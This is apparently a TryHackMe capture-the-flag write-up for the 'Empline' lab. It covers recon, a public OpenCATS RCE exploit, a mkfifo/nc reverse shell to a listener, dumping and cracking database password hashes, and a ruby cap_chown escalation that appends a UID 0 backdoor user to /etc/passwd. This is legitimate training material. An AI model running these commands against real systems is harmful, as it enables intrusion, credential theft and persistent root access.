# TryHackMe - Empline Writeup

## Recon

Kicked off with a full port/service scan against the box:

```
└─$ nmap -Pn -sS -sV -sC -A -T4 10.49.144.179    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 09:52 +0530
Nmap scan report for 10.49.144.179
Host is up (0.034s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Empline
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MariaDB 5.5.5-10.1.48
```

Standard triad: SSH, a web app, and MySQL exposed directly. The web app is called "Empline" - a generic corporate site with Home/About/Testimonials/Employment/Contact Us nav.

## Subdomain Discovery

Digging through the page source for the "Employment" nav link turned up a subdomain instead of a normal anchor:

```html
<li class="scroll-to-section"><a href="http://job.empline.thm/careers" class="menu-item">Employment</a></li>
```

Added `job.empline.thm` to `/etc/hosts` and browsed to it - it's running **OpenCATS**, an open-source applicant tracking system.

## Identifying the Vulnerability

Checked for known exploits against OpenCATS:

```
└─$ searchsploit opencats
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
------------------------------------------------------------------------------------- ---------------------------------
OpenCATS 0.9.4 - Remote Code Execution (RCE)                                          | php/webapps/50585.sh
OpenCats 0.9.4-2 - 'docx ' XML External Entity Injection (XXE)                        | php/webapps/50316.py
OpenCats 0.9.7.4 - SQL Injection                                                      | multiple/webapps/52579.py
------------------------------------------------------------------------------------- ---------------------------------
```

The install fingerprinted as 0.9.4, so the RCE (50585.sh) was the play. This exploit abuses the resume upload feature on the career portal apply form - it uploads a `.php` file disguised with a `GIF87a` magic-byte prefix, then hits it directly to get code execution.

## Exploitation

```
└─$ ./50585.sh http://job.empline.thm
 _._     _,-'""`-._ 
(,-.`._,'(       |\`-/|        RevCAT - OpenCAT RCE
    `-.-' \ )-`( , o o)         Nicholas  Ferreira
          `-    \`_`"'-   https://github.com/Nickguitar-e 

[*] Attacking target http://job.empline.thm
[*] Checking CATS version...
-e [*] Version detected: 0.9.4
[*] Creating temp file with payload...
[*] Checking active jobs...
-e [+] Jobs found! Using job id 1
[*] Sending payload...
-e [+] Payload Fe7zL.php uploaded!
[*] Deleting created temp file...
[*] Checking shell...
-e [+] Got shell! :D
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux empline 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

Shell as `www-data`. Stabilized it with a fifo reverse shell to a listener:

```
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.144.158 4445 > /tmp/f
```

## Loot: Database Credentials

`www-data` had read access to the app config, which had plaintext DB creds:

```
$ cat /var/www/opencats/config.php
...
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

## MySQL Enumeration

Logged into MariaDB with the `james` creds:

```
└─$ mysql --skip-ssl -u james -p -h empline.thm
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 112
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+

MariaDB [(none)]> use opencats;
MariaDB [opencats]> select user_name,password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | 86d0dfda99dbebc424eb4407947356ac |
| james          | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------------------+
4 rows in set (0.034 sec)
```

`george`'s hash (`86d0dfda99dbebc424eb4407947356ac`) is an unsalted MD5 - fed it to an online cracker and got a hit:

```
Hash: 86d0dfda99dbebc424eb4407947356ac
Type: md5
Result: pretonnevippasempre
```

## Initial Foothold - SSH as george

```
└─$ ssh george@empline.thm
george@empline.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
...
george@empline:~$ ls -al
total 20
drwxrwx--- 4 george george 4096 Sep 23 05:03 .
drwxr-xr-x 4 root   root   4096 Jul 20  2021 ..
drwx------ 2 george george 4096 Sep 23 05:03 .cache
drwx------ 3 george george 4096 Sep 23 05:03 .gnupg
-rw-r--r-- 1 root   root     33 Jul 20  2021 user.txt
george@empline:~$ cat user.txt
91cb89c70aa2e5ce0e0116dab099078e
```

**User flag:** `91cb89c70aa2e5ce0e0116dab099078e`

## Privilege Escalation

Checked for binaries with interesting Linux capabilities:

```
george@empline:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

`ruby` has `cap_chown+ep` - meaning any Ruby script run through this binary can change file ownership regardless of normal permission checks. That's enough to take ownership of `/etc/passwd`, append a new root-equivalent user, and log in as it.

Generated a password hash for a new user:

```
└─$ openssl passwd -1 password123
$1$uboBv5P4$UM8cZHWXhBFn7zt/fw5L.1
```

Used the capability-bearing Ruby to `chown` `/etc/passwd` to myself:

```
george@empline:~$ id
uid=1002(george) gid=1002(george) groups=1002(george)
george@empline:~$ /usr/local/bin/ruby -e 'File.chown(1002, nil, "/etc/passwd")'
george@empline:~$ ls -l /etc/passwd
-rw-r--r-- 1 george root 1660 Jul 20  2021 /etc/passwd
```

With ownership, `/etc/passwd` became writable by `george`. Appended a new UID 0 user with the hash generated above:

```
george@empline:~$ echo 'pwned:$1$uboBv5P4$UM8cZHWXhBFn7zt/fw5L.1:0:0:root:/root:/bin/bash' >> /etc/passwd
george@empline:~$ su pwned
Password: 
root@empline:/home/george# cd /root
root@empline:~# ls -al
total 36
drwx------  4 root root 4096 Jul 20  2021 .
-rw-r--r--  1 root root  227 Jul 20  2021 .wget-hsts
-rw-r--r--  1 root root   33 Jul 20  2021 root.txt
root@empline:~# cat root.txt
74fea7cd0556e9c6f22e6f54bc68f5d5
```

**Root flag:** `74fea7cd0556e9c6f22e6f54bc68f5d5`

## Summary

- Found a hidden subdomain (`job.empline.thm`) buried in the main site's HTML source
- Subdomain ran OpenCATS 0.9.4, vulnerable to a public unauthenticated RCE via the resume upload form
- Got a `www-data` shell, pulled DB creds straight out of `config.php`
- Dumped the `user` table from MySQL, cracked george's unsalted MD5 password
- SSH'd in as george and grabbed the user flag
- Found `ruby` with `cap_chown+ep` via `getcap -r /`, abused it to take ownership of `/etc/passwd`, added a UID 0 backdoor user, and got root
